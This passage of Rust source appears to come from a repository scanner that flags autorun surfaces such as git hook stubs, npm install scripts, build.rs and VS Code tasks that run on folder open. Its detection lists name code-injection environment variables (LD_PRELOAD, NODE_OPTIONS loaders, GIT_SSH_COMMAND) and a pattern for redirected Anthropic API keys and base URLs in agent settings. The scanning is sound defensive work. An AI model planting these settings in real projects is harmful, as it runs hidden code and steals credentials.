        "husky.sh" => same(HUSKY9_SH),
        n => {
            n.starts_with(|c: char| c.is_ascii_lowercase())
                && n.chars().all(|c| c.is_ascii_lowercase() || c == '-')
                && lines == HUSKY9_HOOK
        }
    }
}

/// The tool whose generated stub `text` is, line for line; `None` for anything else.
fn known_stub(hook: &str, text: &str) -> Option<&'static str> {
    if text.len() > 8192 {
        return None;
    }
    let hook = hook.to_ascii_lowercase();
    let hook = hook.as_str();
    let lines: Vec<&str> = text.lines().map(str::trim_end).collect();
    let mut trimmed = lines.as_slice();
    while let [rest @ .., ""] = trimmed {
        trimmed = rest;
    }
    if husky4_stub(hook, trimmed) {
        return Some("husky");
    }
    if simple_git_hooks_stub(&lines) {
        return Some("simple-git-hooks");
    }
    if lines.get(2).is_some_and(|l| PRE_COMMIT_ID.is_match(l))
        && PRE_COMMIT_LINES.iter().all(|want| lines.contains(want))
        && lines.iter().any(|l| pre_commit_python_ok(l))
        && lines.iter().any(|l| PRE_COMMIT_ARGS.is_match(l))
        && lines.iter().all(|l| {
            l.is_empty()
                || PRE_COMMIT_LINES.contains(l)
                || PRE_COMMIT_ID.is_match(l)
                || pre_commit_python_ok(l)
                || PRE_COMMIT_ARGS.is_match(l)
        })
    {
        return Some("pre-commit");
    }
    let body: Vec<&str> = lines.iter().copied().filter(|l| !l.is_empty()).collect();
    if matches!(
        hook,
        "pre-push" | "post-checkout" | "post-commit" | "post-merge"
    ) && body.len() == 3
        && body[0] == "#!/bin/sh"
        && LFS_GUARD.is_match(body[1])
        && body[2] == format!("git lfs {hook} \"$@\"")
    {
        return Some("git-lfs");
    }
    // lefthook rewrites its stub between versions, so this one is judged by what it may hold:
    // shell glue around lefthook that runs no file and downloads, decodes or deletes nothing.
    if lines.first() == Some(&"#!/bin/sh")
        && lines.len() <= 120
        && text.contains("call_lefthook()")
        && text.contains("LEFTHOOK")
        && lines.iter().all(|l| {
            matches!(shape::classify(l), Shape::Allowlisted | Shape::Plain)
                && shape::files_run(&strip_shell_keyword(l)).is_empty()
                && !inline_code(l)
                && !["eval ", "rm ", "chmod ", "base64"]
                    .iter()
                    .any(|bad| l.contains(bad))
        })
    {
        return Some("lefthook");
    }
    None
}

/// The line without the shell keyword that starts it, so the command after it can be read.
fn strip_shell_keyword(line: &str) -> String {
    let t = line.trim_start();
    for kw in ["if ", "elif ", "while ", "! "] {
        if let Some(rest) = t.strip_prefix(kw) {
            return rest.trim_start().to_string();
        }
    }
    t.to_string()
}

/// Files that are a finding by being there; true when `path` is one of them.
fn by_presence(path: &str, out: &mut Vec<Finding>) -> bool {
    if git_hook_name(path).is_some() {
        // `entry_findings` rates it, from the path alone.
        return true;
    }
    let (severity, rule, why, seen) = if base(path).eq_ignore_ascii_case("build.rs") {
        (
            Severity::Info,
            "autorun.build-rs",
            "A Cargo build script runs during cargo build, check and test, and when an editor \
             loads the crate.",
            "build.rs",
        )
    } else if path_is(path, "gradle/wrapper/gradle-wrapper.jar") {
        (
            Severity::Info,
            "autorun.gradle-wrapper",
            "A Gradle wrapper jar is code that ./gradlew runs. Check it against the \
             published checksum for the Gradle version.",
            "gradle-wrapper.jar",
        )
    } else if path_is(path, ".mvn/extensions.xml") {
        (
            Severity::Medium,
            "autorun.maven-extensions",
            "Maven loads the extensions listed here, from the network, before it builds \
             anything.",
            "extensions.xml",
        )
    } else {
        return false;
    };
    out.push(finding(path, severity, rule, 0, why, seen, READ_FIRST));
    true
}

fn base(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// The folder of `path`; empty for a file at the root.
fn parent(path: &str) -> &str {
    path.rsplit_once('/').map_or("", |(dir, _)| dir)
}

/// True when `s` ends with `tail`, without regard to ASCII case. macOS and Windows find a file by
/// a name in any case, so every name the rules look for is matched that way.
fn ends_with_ci(s: &str, tail: &str) -> bool {
    s.len() >= tail.len()
        && s.is_char_boundary(s.len() - tail.len())
        && s[s.len() - tail.len()..].eq_ignore_ascii_case(tail)
}

/// True when `path` is `tail` or ends with `/tail`, without regard to ASCII case.
fn path_is(path: &str, tail: &str) -> bool {
    path.eq_ignore_ascii_case(tail)
        || (path.len() > tail.len()
            && ends_with_ci(path, tail)
            && path.as_bytes()[path.len() - tail.len() - 1] == b'/')
}

/// The part of `path` before the first folder named `folder` (in any ASCII case); `None` when
/// there is none.
fn dir_above<'a>(path: &'a str, folder: &str) -> Option<&'a str> {
    // Lower-casing ASCII keeps every byte offset, so the offsets found here fit `path`.
    let lower = path.to_ascii_lowercase();
    let marker = format!("{}/", folder.to_ascii_lowercase());
    let mut from = 0;
    while let Some(i) = lower[from..].find(&marker) {
        let at = from + i;
        if at == 0 {
            return Some("");
        }
        if path.as_bytes()[at - 1] == b'/' {
            return Some(&path[..at - 1]);
        }
        from = at + marker.len();
    }
    None
}

/// The 1-based line of byte `at`.
fn line_at(text: &str, at: usize) -> usize {
    1 + text.as_bytes()[..at.min(text.len())]
        .iter()
        .filter(|b| **b == b'\n')
        .count()
}

/// The line of the first `"key":` at or after byte `from`; 0 when there is none.
fn key_line(text: &str, from: usize, key: &str) -> usize {
    let needle = format!("\"{key}\"");
    let mut pos = from.min(text.len());
    while let Some(i) = text[pos..].find(&needle) {
        let at = pos + i;
        let end = at + needle.len();
        if text[end..].trim_start().starts_with(':') {
            return line_at(text, at);
        }
        pos = end;
    }
    0
}

/// The line of the first JSON string equal to `value`; 0 when there is none.
fn str_line(text: &str, value: &str) -> usize {
    let needle = format!("\"{}\"", value.replace('\\', "\\\\").replace('"', "\\\""));
    text.find(&needle).map_or(0, |at| line_at(text, at))
}

fn unquote(v: &str) -> &str {
    let v = v.trim();
    for q in ['"', '\''] {
        if v.len() >= 2 && v.starts_with(q) && v.ends_with(q) {
            return &v[1..v.len() - 1];
        }
    }
    v
}

/// The host of a URL, lowercase, without `user@`, port or trailing dot; empty for `file:///x`.
fn url_host(url: &str) -> String {
    let u = url.trim().to_ascii_lowercase();
    let rest = match u.find("://") {
        Some(i)
            if u[..i]
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || "+.-".contains(c)) =>
        {
            &u[i + 3..]
        }
        _ => u.as_str(),
    };
    let authority = rest.split(['/', '?', '#', '\\']).next().unwrap_or("");
    let host = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
    let host = if host.starts_with('[') {
        host
    } else {
        host.split(':').next().unwrap_or("")
    };
    host.trim_end_matches('.').to_string()
}

/// One `key = value` line of an INI-like file with the `[section]` above it. A key is kept as
/// written. A value loses only the spaces and tabs around it, so a stray carriage return stays.
struct Ini {
    line: usize,
    /// Shared by the entries of one section, so a huge header is not copied per entry.
    section: Rc<str>,
    key: String,
    value: String,
}

/// The entries of `text`. A file that uses CRLF for every line break loses the `\r` of each, so
/// only a carriage return that is not a line ending shows in a value. With `continuations` (git
/// config syntax), a value that ends in a backslash goes on with the next line, as git reads it:
/// the entry keeps the number of its first line.
fn ini_entries(text: &str, continuations: bool) -> Vec<Ini> {
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let bytes = text.as_bytes();
    let all_crlf = text.contains('\n')
        && text
            .match_indices('\n')
            .all(|(i, _)| i > 0 && bytes[i - 1] == b'\r');
    let mut section: Rc<str> = Rc::from("");
    let mut out = Vec::new();
    let mut lines = text.split('\n').enumerate();
    while let Some((i, raw)) = lines.next() {
        let raw = if all_crlf {
            raw.strip_suffix('\r').unwrap_or(raw)
        } else {
            raw
        };
        let t = raw.trim_start_matches([' ', '\t']);
        if t.is_empty() || t.starts_with(['#', ';']) {
            continue;
        }
        // `[core] key = value` is a header and an entry on one line.
        let mut entry = t;
        if let Some(rest) = t.strip_prefix('[') {
            let Some(end) = rest.find(']') else {
                continue;
            };
            section = Rc::from(rest[..end].trim());
            entry = rest[end + 1..].trim_matches([' ', '\t']);
            if entry.starts_with(['#', ';']) {
                continue;
            }
        }
        if let Some((k, v)) = entry.split_once('=') {
            let mut value = v.trim_matches([' ', '\t']).to_string();
            loop {
                if !continuations {
                    break;
                }
                let cut = if value.ends_with("\\\r") {
                    2
                } else if value.ends_with('\\') {
                    1
                } else {
                    break;
                };
                value.truncate(value.len() - cut);
                let Some((_, next)) = lines.next() else {
                    break;
                };
                let next = if all_crlf {
                    next.strip_suffix('\r').unwrap_or(next)
                } else {
                    next
                };
                // Spaces before the first character of a value are dropped, wherever it starts.
                if value.trim_matches([' ', '\t']).is_empty() {
                    value.clear();
                    value.push_str(next.trim_start_matches([' ', '\t']));
                } else {
                    value.push_str(next);
                }
            }
            out.push(Ini {
                line: i + 1,
                section: Rc::clone(&section),
                key: k.trim().to_string(),
                value: value.trim_matches([' ', '\t']).to_string(),
            });
        }
    }
    out
}

/// A shell-like text split into logical lines.
struct Logical {
    line: usize,
    /// The first physical line starts with a space or a tab.
    indented: bool,
    text: String,
}

/// The command lines of a Makefile, a shell script or a recipe file: a line that ends in `\`
/// joins the next one; blank lines and comments (`#`, and `dnl` when `dnl` is set) are dropped;
/// a leading `@`, `-` or `+` (recipe flags) is removed.
fn logical_lines(text: &str, dnl: bool) -> Vec<Logical> {
    let mut out = Vec::new();
    let mut lines = text.lines().enumerate();
    while let Some((i, raw)) = lines.next() {
        let indented = raw.starts_with([' ', '\t']);
        let mut joined = raw.trim().to_string();
        while joined.ends_with('\\') {
            joined.pop();
            let kept = joined.trim_end().len();
            joined.truncate(kept);
            let Some((_, next)) = lines.next() else {
                break;
            };
            joined.push(' ');
            joined.push_str(next.trim());
        }
        let joined = joined.trim();
        let comment =
            joined.starts_with('#') || (dnl && (joined == "dnl" || joined.starts_with("dnl ")));
        let command = joined.trim_start_matches(['@', '-', '+']).trim_start();
        if joined.is_empty() || comment || command.is_empty() {
            continue;
        }
        out.push(Logical {
            line: i + 1,
            indented,
            text: command.to_string(),
        });
    }
    out
}

/// A YAML scalar: quotes removed, or a trailing ` # comment` cut.
fn yaml_scalar(raw: &str) -> String {
    let raw = raw.trim();
    for q in ['"', '\''] {
        if let Some(rest) = raw.strip_prefix(q)
            && let Some(end) = rest.find(q)
        {
            return rest[..end].to_string();
        }
    }
    raw.split(" #").next().unwrap_or("").trim().to_string()
}

/// `key: value` from one YAML line.
fn yaml_kv(content: &str) -> Option<(&str, String)> {
    let (key, rest) = match content.find(": ") {
        Some(i) => (&content[..i], &content[i + 2..]),
        None => (content.strip_suffix(':')?, ""),
    };
    Some((key.trim(), yaml_scalar(rest)))
}

/// `|`, `>` and their variants start a block scalar.
fn is_block(value: &str) -> bool {
    value.starts_with(['|', '>'])
}

/// The non-blank lines after line index `from` that are indented deeper than `indent`, as
/// 1-based line numbers with their trimmed text.
fn block_lines(lines: &[&str], from: usize, indent: usize) -> Vec<(usize, String)> {
    let mut out = Vec::new();
    for (j, l) in lines.iter().enumerate().skip(from + 1) {
        let c = l.trim_start();
        if c.is_empty() {
            continue;
        }
        if l.len() - c.len() <= indent {
            break;
        }
        if !c.starts_with('#') {
            out.push((j + 1, c.to_string()));
        }
    }
    out
}

/// Words joined by spaces; a word with whitespace, or an empty one, is double-quoted.
fn join_args(parts: &[String]) -> String {
    parts
        .iter()
        .map(|p| {
            if p.is_empty() || p.contains(char::is_whitespace) {
                format!("\"{}\"", p.replace('"', "\\\""))
            } else {
                p.clone()
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

// package.json

fn package_json(cx: &mut Cx) {
    let text = cx.text;
    let v = match jsonc::parse(text) {
        Ok(v) => v,
        Err(e) => return cx.unparsed(&e, Raw::Package),
    };
    let scripts = script_pairs(&v);
    let dir = parent(cx.path).to_string();
    let anchor = text.find("\"scripts\"").unwrap_or(0);
    for (name, command) in &scripts {
        let Some((rule, trigger, floor)) = npm_rule(name) else {
            continue;
        };
        // `start` and `dev` only count when they run a data file.
        if floor == Severity::High && !runs_data(command, &scripts) {
            continue;
        }
        let line = key_line(text, anchor, name);
        cx.surface(rule, trigger, command, line, &dir, floor);
    }
}

/// The rule, trigger and floor of an npm script name that starts by itself; `start` and `dev`
/// are the data-file rule (floor HIGH), which the caller applies only to a script that runs data.
fn npm_rule(name: &str) -> Option<(&'static str, Trigger, Severity)> {
    Some(match name {
        "preinstall" | "install" | "postinstall" => {
            ("autorun.npm-lifecycle", Trigger::Install, Severity::Info)
        }
        "prepare" | "prepublish" | "prepack" => {
            ("autorun.npm-lifecycle", Trigger::Build, Severity::Info)
        }
        "start" | "dev" => ("autorun.npm-start-data", Trigger::OptIn, Severity::High),
        _ => return None,
    })
}

/// True when the command, or the script of the same file it asks npm to run, runs a data file.
fn runs_data(command: &str, scripts: &[(String, String)]) -> bool {
    if shape::classify(command) == Shape::RunsData {
        return true;
    }
    shape::npm_run_target(command)
        .and_then(|t| scripts.iter().find(|(n, _)| *n == t))
        .is_some_and(|(_, c)| shape::classify(c) == Shape::RunsData)
}

// VS Code and Cursor

fn vscode_tasks(cx: &mut Cx) {
    let v = match jsonc::parse(cx.text) {
        Ok(v) => v,
        Err(e) => return cx.unparsed(&e, Raw::Tasks),
    };
    let Some(tasks) = v
        .as_object()
        .and_then(|o| o.get("tasks"))
        .and_then(Value::as_array)
    else {
        return;
    };
    let dir = parent(parent(cx.path)).to_string();
    let file_options = v
        .as_object()
        .and_then(|o| o.get("options"))
        .and_then(Value::as_object);
    tasks_from(cx, tasks, file_options, &dir);
}

/// The `options` object of a task, of one of its platform blocks, or of a tasks file.
fn options_of(task: &Map) -> Option<&Map> {
    task.get("options").and_then(Value::as_object)
}

/// The surfaces of the tasks of a `tasks.json` or of the `tasks` block of a workspace file.
/// `file_options` is the `options` object next to the `tasks` array; a task takes what it does
/// not set itself from there.
fn tasks_from<'a>(cx: &mut Cx, tasks: &'a [Value], file_options: Option<&'a Map>, dir: &str) {
    let text = cx.text;
    let mut walk = TaskWalk {
        by_label: HashMap::new(),
        visits: 0,
        file_options,
        envs: Vec::new(),
    };
    for task in tasks.iter().filter_map(Value::as_object) {
        if let Some(label) = task.get("label").and_then(Value::as_str) {
            walk.by_label.entry(label).or_insert(task);
        }
    }
    let mut hidden = false;
    let mut runs_on_open = false;
    for task in tasks.iter().filter_map(Value::as_object) {
        if cx.found.len() >= MAX_TASK_COMMANDS || walk.visits >= MAX_TASK_VISITS {
            break;
        }
        if task
            .get("runOptions")
            .and_then(Value::as_object)
            .and_then(|o| o.get("runOn"))
            .and_then(Value::as_str)
            != Some("folderOpen")
        {
            continue;
        }
        hidden |= hides_output(task);
        if !runs_on_open {
            runs_on_open = true;
            // What every task inherits counts once some task runs on open.
            walk.envs.extend(
                file_options
                    .and_then(|o| o.get("env"))
                    .and_then(Value::as_object),
            );
        }
        let mut commands = Vec::new();
        walk.collect(task, &mut HashSet::new(), 0, &mut commands);
        for (command, literal) in commands {
            if cx.found.len() >= MAX_TASK_COMMANDS {
                break;
            }
            // A line lookup scans the file: only the first few commands get one.
            let line = if cx.found.len() < 200 {
                str_line(text, &literal)
            } else {
                0
            };
            if !cx
                .found
                .iter()
                .any(|s| s.command == command && s.line == line)
            {
                cx.surface(
                    "autorun.vscode-folder-open",
                    Trigger::Open,
                    &command,
                    line,
                    dir,
                    Severity::Info,
                );
            }
        }
    }
    if hidden {
        cx.notes.push(
            "A task that runs on folder open hides its output (reveal never, echo off)."
                .to_string(),
        );
    }
    task_env_finding(cx, &walk.envs);
}

/// Environment variables that make the program a task starts run code: these are the keys of the
/// agent settings rules (`env` of `.claude/settings.json`) that redirect a tool, plus the ones
/// that load code or name a program. A task that runs on open starts the program at once.
fn task_env_finding(cx: &mut Cx, envs: &[&Map]) {
    let text = cx.text;
    let mut worst: Option<(Severity, String, String)> = None;
    for env in envs {
        for (key, value) in env.iter().take(500) {
            let Some(value) = value.as_str() else {
                continue;
            };
            if let Some(level) = task_env_level(key, value)
                && worst.as_ref().is_none_or(|(s, _, _)| level > *s)
            {
                worst = Some((level, key.to_string(), format!("{key}={value}")));
            }
        }
    }
    let Some((severity, key, seen)) = worst else {
        return;
    };
    let why = match severity {
        Severity::Medium => {
            "A task that runs when the folder opens points a service at another address."
        }
        Severity::High => {
            "A task that runs when the folder opens puts a folder of the repo on a search path \
             of the program it starts, so that program can load or run code the repo ships."
        }
        _ => {
            "A task that runs when the folder opens sets an environment variable that makes the \
             program it starts load or run code, or redirects a tool."
        }
    };
    cx.find(
        severity,
        "autorun.vscode-task-env",
        key_line(text, 0, &key),
        why,
        &seen,
        READ_FIRST,
    );
}

/// Keys that run a program or load code whatever their value is.
const TASK_ENV_CODE_KEYS: &[&str] = &[
    "BASH_ENV",
    "ZDOTDIR",
    "LD_PRELOAD",
    "LD_AUDIT",
    "DYLD_INSERT_LIBRARIES",
    "GIT_SSH_COMMAND",
    "GIT_SSH",
    "GIT_ASKPASS",
    "SSH_ASKPASS",
    "GIT_EXEC_PATH",
    "GIT_CONFIG_COUNT",
    "GIT_CONFIG_GLOBAL",
    "GIT_CONFIG_SYSTEM",
    "PYTHONSTARTUP",
    "CLAUDE_CONFIG_DIR",
    "CODEX_HOME",
    "NODE_EXTRA_CA_CERTS",
    "HTTP_PROXY",
    "HTTPS_PROXY",
    "ALL_PROXY",
];
/// Keys whose value is a list of options, which load code when one of them names a module.
const TASK_ENV_OPTION_KEYS: &[&str] = &[
    "NODE_OPTIONS",
    "PERL5OPT",
    "RUBYOPT",
    "JAVA_TOOL_OPTIONS",
    "_JAVA_OPTIONS",
];
/// Keys whose value is a list of folders searched for programs, libraries or modules.
const TASK_ENV_PATH_KEYS: &[&str] = &[
    "PATH",
    "LD_LIBRARY_PATH",
    "DYLD_LIBRARY_PATH",
    "DYLD_FRAMEWORK_PATH",
    "PYTHONPATH",
    "PERL5LIB",
    "RUBYLIB",
    "NODE_PATH",
];

static TASK_ENV_LOADS_CODE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?:^|\s)(?:-r|-M|-I|--require|--import|--loader|--experimental-loader|-javaagent|-agentpath|-agentlib)",
    )
    .expect("pattern compiles")
});

static TASK_ENV_REDIRECT: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^(?:ANTHROPIC_(?:.*_)?(?:BASE_URL|API_KEY|AUTH_TOKEN)|CLAUDE_.*_BASE_URL)$")
        .expect("pattern compiles")
});

/// How much an environment variable of a task that runs on open is worth, or `None`.
fn task_env_level(key: &str, value: &str) -> Option<Severity> {
    // Names are not case-sensitive on Windows.
    let key = key.to_ascii_uppercase();
    let key = key.as_str();
    if TASK_ENV_CODE_KEYS.contains(&key)
        || TASK_ENV_REDIRECT.is_match(key)
        || key.starts_with("GIT_CONFIG_KEY_")
        || key.starts_with("GIT_CONFIG_VALUE_")
        // `ENV` is a file of shell code only when it is a path; `ENV=production` is a name.
        || (key == "ENV" && value.contains(['/', '\\']))
        || (TASK_ENV_OPTION_KEYS.contains(&key) && TASK_ENV_LOADS_CODE.is_match(value))
    {
        return Some(Severity::Critical);
    }
    if TASK_ENV_PATH_KEYS.contains(&key) && search_path_names_the_repo(value) {
        return Some(Severity::High);
    }
    (key.ends_with("_BASE_URL")).then_some(Severity::Medium)
}

/// True when a search path (`a:b`, `a;b`) has a relative entry or one under the workspace folder.
fn search_path_names_the_repo(value: &str) -> bool {
    value
        .replace("${env:", "${env_")
        .split([':', ';'])
        .map(str::trim)
        // A single letter is a Windows drive; `.` is the folder itself.
        .filter(|e| !e.is_empty() && !(e.len() == 1 && e.as_bytes()[0].is_ascii_alphabetic()))
        .any(|e| {
            e.starts_with("${workspaceFolder}")
                || e.starts_with("${workspaceRoot}")
                || e.starts_with("${cwd}")
                || !e.starts_with(['/', '\\', '~', '$']) && e.as_bytes().get(1) != Some(&b':')
        })
}

fn hides_output(task: &Map) -> bool {
    task.get("presentation")
        .and_then(Value::as_object)
        .is_some_and(|p| {
            p.get("reveal").and_then(Value::as_str) == Some("never")
                && p.get("echo").and_then(Value::as_bool) == Some(false)
        })
}

/// Limits on what one tasks file may make the scan do: commands kept, tasks visited in all, and
/// how deep a `dependsOn` chain is followed. A file past them is hostile, and what it lists
/// before the limit is already flagged.
const MAX_TASK_COMMANDS: usize = 1_000;
const MAX_TASK_VISITS: usize = 20_000;
const MAX_TASK_DEPTH: usize = 16;

/// The tasks of one file by label, and how many the walk has visited.
struct TaskWalk<'a> {
    by_label: HashMap<&'a str, &'a Map>,
    visits: usize,
    /// The `options` next to the `tasks` array, which every task inherits.
    file_options: Option<&'a Map>,
    /// The `env` objects of the tasks the walk has reached and of their platform blocks.
    envs: Vec<&'a Map>,
}

impl<'a> TaskWalk<'a> {
    /// Adds to `out` the commands a task starts, each with the JSON string it came from (to find
    /// its line): the task's own, those of its `windows`, `linux` and `osx` blocks, and those of
    /// the tasks it `dependsOn`. A label already in `seen` is skipped, so a cycle ends.
    fn collect(
        &mut self,
        task: &'a Map,
        seen: &mut HashSet<&'a str>,
        depth: usize,
        out: &mut Vec<(String, String)>,
    ) {
        if depth > MAX_TASK_DEPTH
            || self.visits >= MAX_TASK_VISITS
            || out.len() >= MAX_TASK_COMMANDS
        {
            return;
        }
        self.visits += 1;
        let label = task.get("label").and_then(Value::as_str).unwrap_or("");
        if !label.is_empty() && !seen.insert(label) {
            return;
        }
        // The options a command runs under, nearest first: its platform block, the task, the file.
        let own = options_of(task);
        out.extend(command_of(task, &[own, self.file_options]));
        self.envs
            .extend(own.and_then(|o| o.get("env")).and_then(Value::as_object));
        for os in ["windows", "linux", "osx"] {
            if let Some(block) = task.get(os).and_then(Value::as_object) {
                let block_options = options_of(block);
                let chain = [block_options, own, self.file_options];
                // A block that sets only a shell runs the task's own command under it.
                let command = command_of(block, &chain).or_else(|| {
                    block_options
                        .is_some_and(|o| o.contains_key("shell"))
                        .then(|| command_of(task, &chain))
                        .flatten()
                });
                out.extend(command);
                self.envs.extend(
                    block_options
                        .and_then(|o| o.get("env"))
                        .and_then(Value::as_object),
                );
            }
        }
        let deps: Vec<&'a str> = match task.get("dependsOn") {
            Some(Value::Str(s)) => vec![s.as_str()],
            Some(Value::Array(a)) => a.iter().filter_map(Value::as_str).collect(),
            _ => Vec::new(),
        };
        for dep in deps {
            if let Some(target) = self.by_label.get(dep).copied() {
                self.collect(target, seen, depth + 1, out);
            }
        }
    }
}

/// The program a task's shell is: `options.shell.executable`, and `options.shell.args`, each from
/// the nearest of `chain` that sets it. A path into the repo gets a leading `./`, so the file the
/// task starts shows up as a file the command runs.
fn shell_prefix(chain: &[Option<&Map>]) -> Option<String> {
    let shells: Vec<&Map> = chain
        .iter()
        .flatten()
        .filter_map(|o| o.get("shell").and_then(Value::as_object))
        .collect();
    let executable = shells
        .iter()
        .find_map(|s| s.get("executable").and_then(Value::as_str))?;
    let args = shells
        .iter()
        .find_map(|s| s.get("args").and_then(Value::as_array));
    let mut words = vec![shell_word(executable)];
    words.extend(
        args.into_iter()
            .flatten()
            .filter_map(|w| w.as_str().map(str::to_string)),
    );
    Some(join_args(&words))
}

/// A shell executable as a command word. A relative path (`${workspaceFolder}/x`, `x/y`, `.\x`)
/// becomes `./x/y`; a bare name and an absolute path stay as they are.
fn shell_word(executable: &str) -> String {
    fn in_repo(path: &str) -> String {
        let path = path.replace('\\', "/");
        if path.starts_with("./") || path.starts_with("../") {
            path
        } else {
            format!("./{path}")
        }
    }
    let e = executable.trim();
    if let Some(rest) = ["${workspaceFolder}", "${workspaceRoot}"]
        .iter()
        .find_map(|p| e.strip_prefix(p))
    {
        return in_repo(rest.trim_start_matches(['/', '\\']));
    }
    let absolute = e.starts_with(['/', '\\', '~', '$']) || e.as_bytes().get(1) == Some(&b':');
    if absolute || !e.contains(['/', '\\']) {
        e.to_string()
    } else {
        in_repo(e)
    }
}

/// The command line of a task or of one of its platform blocks, with the string it came from. The
/// shell of the nearest `options` in `chain` that names one starts it.
fn command_of(task: &Map, chain: &[Option<&Map>]) -> Option<(String, String)> {
    let given = match task.get("command") {
        Some(Value::Object(o)) => o.get("value"),
        other => other,
    };
    // A string, or an array of strings (the words of the command).
    let (mut line, command) = match given {
        Some(Value::Str(s)) => (s.clone(), s.clone()),
        Some(Value::Array(a)) => {
            let words: Vec<String> = a
                .iter()
                .filter_map(|w| w.as_str().map(str::to_string))
                .collect();
            if words.is_empty() {
                return None;
            }
            (join_args(&words), words[0].clone())
        }
        _ => {
            if task.get("type").and_then(Value::as_str) == Some("npm") {
                let script = task.get("script").and_then(Value::as_str)?;
                let line = format!("npm run {script}");
                let line = match shell_prefix(chain) {
                    Some(prefix) => format!("{prefix} {line}"),
                    None => line,
                };
                return Some((line, script.to_string()));
            }
            return None;
        }
    };
    if let Some(args) = task.get("args").and_then(Value::as_array) {
        let words: Vec<String> = args
            .iter()
            .filter_map(|a| match a {
                Value::Str(s) => Some(s.clone()),
                Value::Object(o) => o.get("value").and_then(Value::as_str).map(str::to_string),
                _ => None,
            })
            .collect();
        if !words.is_empty() {
            line = format!("{line} {}", join_args(&words));
        }
    }
    if let Some(prefix) = shell_prefix(chain) {
        line = format!("{prefix} {line}");
    }
    Some((line, command))
}

fn vscode_settings(cx: &mut Cx) {
    let v = match jsonc::parse(cx.text) {
        Ok(v) => v,
        Err(e) => return cx.unparsed(&e, Raw::Settings),
    };
    if let Some(o) = v.as_object() {
        settings_from(cx, o);
    }
}

/// A `*.code-workspace` file: its `settings` block gets the rules of `settings.json` and its
/// `tasks` block those of `tasks.json`.
fn code_workspace(cx: &mut Cx) {
    let v = match jsonc::parse(cx.text) {
        Ok(v) => v,
        Err(e) => return cx.unparsed(&e, Raw::Tasks),
    };
    let Some(o) = v.as_object() else {
        return;
    };
    if let Some(settings) = o.get("settings").and_then(Value::as_object) {
        settings_from(cx, settings);
    }
    if let Some(tasks) = o
        .get("tasks")
        .and_then(Value::as_object)
        .and_then(|t| t.get("tasks"))
        .and_then(Value::as_array)
    {
        let dir = parent(cx.path).to_string();
        let file_options = o
            .get("tasks")
            .and_then(Value::as_object)
            .and_then(|t| t.get("options"))
            .and_then(Value::as_object);
        tasks_from(cx, tasks, file_options, &dir);
    }
}

/// True for the `files.exclude` keys that hide the `.vscode` folder; `.vscode-test` and the like
/// are other folders.
fn hides_vscode(key: &str) -> bool {
    matches!(
        key.trim(),
        ".vscode" | "**/.vscode" | ".vscode/**" | "**/.vscode/**"
    )
}

/// Editor settings that name a program the editor or an extension runs. The list is explicit: a
/// key that names a config file, an ignore list, a stub folder or a virtual environment is data,
/// not a program, and is not rated.
const PROGRAM_KEYS: &[&str] = &[
    "python.defaultInterpreterPath",
    "python.pythonPath",
    "typescript.tsdk",
    "eslint.runtime",
    "eslint.nodePath",
    "git.path",
    "rust-analyzer.server.path",
    "go.goroot",
    "clangd.path",
    "dart.sdkPath",
    "deno.path",
    "ruby.interpreter.commandPath",
];

/// True for a settings key that names a program: the explicit keys, `*.executablePath`,
/// `*.serverPath`, `terminal.integrated.shell.*`, `go.alternateTools` (a map of tool to program)
/// and `terminal.integrated.profiles.*` (a map of profile to an object with a `path`).
fn is_program_key(key: &str) -> bool {
    PROGRAM_KEYS.contains(&key)
        || key.ends_with(".executablePath")
        || key.ends_with(".serverPath")
        || key.starts_with("terminal.integrated.shell.")
        || key == "go.alternateTools"
        || key.starts_with("terminal.integrated.profiles.")
}

/// The programs a program setting names, as `(name for the report, value)`: a string, the
/// strings of an array, or what a map of tools or profiles holds.
fn program_values(key: &str, value: &Value) -> Vec<(String, String)> {
    fn strings(v: &Value) -> Vec<String> {
        match v {
            Value::Str(s) => vec![s.clone()],
            Value::Array(a) => a
                .iter()
                .filter_map(|w| w.as_str().map(str::to_string))
                .collect(),
            _ => Vec::new(),
        }
    }
    let mut out = Vec::new();
    if key == "go.alternateTools" {
        for (name, v) in value
            .as_object()
            .into_iter()
            .flat_map(|o| o.iter())
            .take(50)
        {
            out.extend(strings(v).into_iter().map(|s| (format!("{key}.{name}"), s)));
        }
    } else if key.starts_with("terminal.integrated.profiles.") {
        for (name, profile) in value
            .as_object()
            .into_iter()
            .flat_map(|o| o.iter())
            .take(50)
        {
            if let Some(path) = profile.as_object().and_then(|p| p.get("path")) {
                out.extend(
                    strings(path)
                        .into_iter()
                        .map(|s| (format!("{key}.{name}.path"), s)),
                );
            }
        }
    } else {
        out.extend(strings(value).into_iter().map(|s| (key.to_string(), s)));
    }
    out
}

/// The folder a settings file's relative paths start from: the one above `.vscode` for
/// `settings.json`, the one the file is in for a `*.code-workspace`.
fn workspace_base(path: &str) -> &str {
    if ends_with_ci(base(path), ".code-workspace") {
        parent(path)
    } else {
        parent(parent(path))
    }
}

/// The path of a workspace-relative `value` from the root of the repo, with `.` and `..`
/// resolved, when `base` is the folder it starts from; `None` when it leaves the repo.
fn workspace_target(value: &str, base: &str) -> Option<String> {
    let rel = value
        .trim()
        .trim_start_matches("${workspaceFolder}")
        .trim_start_matches("${workspaceRoot}");
    let mut parts: Vec<&str> = base.split('/').filter(|c| !c.is_empty()).collect();
    for part in rel.split(['/', '\\']) {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            p => parts.push(p),
        }
    }
    Some(parts.join("/"))
}

/// How much a program setting is worth: nothing for a bare name (found on PATH), HIGH for a
/// path into the repo (the repo supplies the program, if the tree has it), MEDIUM for a path
/// outside the repo or one into an installed `node_modules`. `base` is the folder a relative path
/// starts from.
fn program_value_severity(value: &str, base: &str) -> Option<Severity> {
    let v = value.trim();
    if v.is_empty() || !v.contains(['/', '\\']) && !v.starts_with(['.', '~', '$']) {
        return None;
    }
    let elsewhere = v.starts_with(['/', '~', '\\'])
        || v.as_bytes().get(1) == Some(&b':')
        || (v.starts_with("${")
            && !v.starts_with("${workspaceFolder}")
            && !v.starts_with("${workspaceRoot}"));
    if elsewhere {
        return Some(Severity::Medium);
    }
    match workspace_target(v, base) {
        Some(target)
            if !target
                .split('/')
                .any(|c| c.eq_ignore_ascii_case("node_modules")) =>
        {
